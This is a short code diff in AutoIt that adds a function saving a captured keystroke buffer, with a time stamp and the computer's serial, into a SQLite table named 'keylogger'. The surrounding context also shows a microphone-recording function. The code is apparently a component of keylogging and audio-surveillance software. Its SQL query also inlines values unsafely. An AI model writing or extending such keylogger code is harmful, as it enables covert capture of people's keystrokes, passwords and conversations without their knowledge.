@@ -148,5 +148,37 @@ Func PutMicrophoneRecordingLocal($computer_serial,$epoch,$filename,$filePath)
 EndFunc
 
 
+Func putKeysLocal()
+	
+    Local	 $keys=$keyBuffer
+	
+	Local $epoch=generateDateTime()
+	
+	sqliteStart()
+	
+	 _SQLite_Exec($databaseHandle, "INSERT INTO keylogger(id,keys,computer_serial,epoch) VALUES (Null,'$keys$','$computer_serial$','$epoch$');") 
+	
+    if @error Then
+		
+		sqliteStop()
+		
+		local $error_=_SQLite_ErrMsg ($databaseHandle)
+		
+		return $error_
+		
+		
+	Else
+		
+		$keyBuffer=""
+		
+		sqliteStop()
+		
+		return "ok"
+		
+	EndIf
+	
+EndFunc
+
+
 
 
